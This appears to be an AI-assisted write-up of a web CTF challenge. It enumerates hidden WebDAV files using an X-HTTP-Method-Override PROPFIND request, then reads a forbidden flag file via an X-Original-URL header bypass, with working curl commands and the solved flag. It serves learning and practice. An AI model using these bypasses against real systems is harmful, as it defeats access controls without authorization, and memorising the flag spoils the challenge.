**Initial Reconnaissance:**
1.  Accessed the main URL `http://ctf.nexus-security.club:3555`, which returned "WELCOME TO THIS EASY CTF CHALLENGE".
2.  The user provided hints about subdomains: `public` (400), `share` (400), `vault` (403).
3.  Attempted to access these as subdomains using DNS resolution and Host header manipulation, but they either failed to resolve or returned the default "Welcome" page.

**Path-Based Discovery:**
1.  Discovered that accessing the paths `/public`, `/share`, and `/vault` on the main domain replicated the status codes provided by the user:
    *   `GET http://ctf.nexus-security.club:3555/public` -> 400 Bad Request ("Cannot GET directory")
    *   `GET http://ctf.nexus-security.club:3555/share` -> 400 Bad Request ("Cannot GET directory")
    *   `GET http://ctf.nexus-security.club:3555/vault` -> 403 Forbidden

**WebDAV Vulnerability (PROPFIND Method Override):**
1.  Performed an `OPTIONS` request on `/public` and `/vault`, which returned `Allow: GET, POST, OPTIONS`, `DAV: 1,2`, and `MS-Author-Via: DAV`. This indicated WebDAV functionality.
2.  Standard WebDAV methods (like `PROPFIND`) were not listed in `Allow` and resulted in `405 Method Not Allowed`.
3.  However, `PROPFIND` was successfully executed by using the `X-HTTP-Method-Override` header in a `POST` request:
    `curl -v -X POST -H "X-HTTP-Method-Override: PROPFIND" -H "Depth: 1" http://ctf.nexus-security.club:3555/public`
    This returned a custom XML structure listing files in the directory.

**File Enumeration:**
1.  Using the `PROPFIND` method override with `Depth: 1`, the following files/directories were discovered:
    *   `/`: `notes.txt`, `public`, `share`, `vault`
    *   `/public`: `index.html`, `readme.txt`
    *   `/share`: `index.html`, `info.txt`
    *   `/vault`: `flag.txt`, `secret.txt`

**Information Gathering from Readable Files:**
1.  `http://ctf.nexus-security.club:3555/public/readme.txt` contained "Public file".
2.  `http://ctf.nexus-security.club:3555/share/info.txt` contained "Public info".
3.  `http://ctf.nexus-security.club:3555/notes.txt` contained "mr7ba bik kho , rak 9riiiiiiiib" (Welcome brother, you are very close), indicating the correct path.

**Bypassing 403 Forbidden on `/vault/flag.txt`:**
1.  Attempts to `GET`, `COPY`, or `MOVE` `/vault/flag.txt` resulted in `403 Forbidden` or `405 Method Not Allowed`.
2.  Recognizing the "bugbounty" hint and the discrepancy in how HTTP headers are processed by different components of a web server stack (e.g., reverse proxy vs. application router), a common bypass technique involving `X-Original-URL` was attempted.
3.  The request was structured to target an *allowed* resource (`/notes.txt`) while including `X-Original-URL` header pointing to the *forbidden* resource (`/vault/flag.txt`).

**Exploitation:**
`curl -H "X-Original-URL: /vault/flag.txt" http://ctf.nexus-security.club:3555/notes.txt`

**Result:**
The server responded with the content of `flag.txt`.

**Flag:**
`nexus{w3bd4v_wchw3y4_h3d34rs_ezzzzzzzzz}`

